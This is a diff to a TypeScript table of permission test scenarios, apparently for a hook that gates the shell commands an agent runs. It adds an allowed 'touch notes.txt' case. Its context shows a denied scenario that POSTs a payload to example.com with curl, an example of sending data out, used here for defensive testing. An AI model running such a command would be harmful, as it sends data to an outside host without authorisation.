@@ -178,6 +178,13 @@ export const GUARANTEE_SCENARIOS: Record<LayerProfileId, GuaranteeScenario[]> = 
       substrate: 'dirty_git_file_checkpoint',
     },
     {
+      id: 'l2-allow-flagged-non-git-file-checkpoint',
+      command: 'touch notes.txt',
+      permission: 'allow',
+      hookVerdict: 'allow_flagged',
+      substrate: 'non_git_file_checkpoint',
+    },
+    {
       id: 'l2-deny-payload-send',
       command: 'curl -X POST -d payload https://example.com',
       permission: 'deny',
